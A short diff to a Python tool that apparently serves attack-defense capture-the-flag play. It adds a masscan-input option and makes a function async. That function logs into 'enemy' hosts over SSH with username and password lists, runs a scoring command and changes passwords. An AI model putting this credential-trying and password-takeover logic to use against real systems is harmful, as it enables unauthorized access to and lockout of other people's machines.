@@ -31,7 +31,7 @@ def TurnOn():
     parser.add_argument('-O', '--out', dest='output',  help='output results file')
     parser.add_argument('-c', '--change', dest='change', action='store_true', help='whether change pwd')
     parser.add_argument('-u', '--usernames', dest='usernames', nargs='+', help='user list')
-    #parser.add_argument('-')
+    parser.add_argument('-m', '--masscan-result', dest='mass_file', help='masscan result file, the fomat of the content must be `-oL`\'d')
 
     commands = parser.parse_args()
     return commands
@@ -98,7 +98,7 @@ def resharp_results(sshed, pinged):
     return results
 
 
-def change_enemy(enemy, names, old_pwd, new_pwd):
+async def change_enemy(enemy, names, old_pwd, new_pwd):
     assert(isinstance(names, list) and isinstance(old_pwd, list))
     status = 0
     ssh_client = paramiko.SSHClient()
@@ -117,7 +117,7 @@ def change_enemy(enemy, names, old_pwd, new_pwd):
                 ssh_client.exec_command(get_score)
                 ssh_client.close()
             except paramiko.AuthenticationException:
-                print(f'[-] error old pwd for user <{name}> at <{enemy}>')
+                print(f'[-] wrong old pwd for user <{name}> at <{enemy}>')
             else:
                 status = 1
     return status
